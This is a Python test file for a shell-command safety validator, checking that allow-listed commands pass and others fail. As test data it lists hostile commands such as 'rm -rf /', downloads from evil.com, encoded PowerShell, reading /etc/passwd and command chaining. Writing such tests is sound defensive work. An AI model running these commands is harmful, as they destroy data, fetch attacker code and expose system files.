"""Tests for the shell command execution handler."""

from m4stclaw.servers.shell_handler import is_command_safe, ALLOWED_BINARIES


def test_allowed_commands_pass():
    """Commands with allowed binaries should pass validation."""
    allowed_commands = [
        "git status",
        "python --version",
        "npm install",
        "pytest tests/",
        "echo hello",
    ]
    for cmd in allowed_commands:
        safe, reason = is_command_safe(cmd)
        assert safe is True, f"Command '{cmd}' should be safe but got: {reason}"


def test_blocked_commands_fail():
    """Commands with unapproved binaries should be blocked."""
    blocked_commands = [
        "rm -rf /",
        "curl https://evil.com/payload.sh",
        "wget malware.exe",
        "powershell -encodedcommand abc",
    ]
    for cmd in blocked_commands:
        safe, reason = is_command_safe(cmd)
        assert safe is False, f"Command '{cmd}' should be blocked"


def test_chained_commands_blocked():
    """Commands with chaining operators should be blocked."""
    chained_commands = [
        "git status && rm -rf /",
        "echo hi | cat /etc/passwd",
        "python test.py; curl evil.com",
    ]
    for cmd in chained_commands:
        safe, reason = is_command_safe(cmd)
        assert safe is False, f"Chained command '{cmd}' should be blocked"


def test_empty_command_blocked():
    """Empty commands should be blocked."""
    safe, reason = is_command_safe("")
    assert safe is False
    safe, reason = is_command_safe("   ")
    assert safe is False
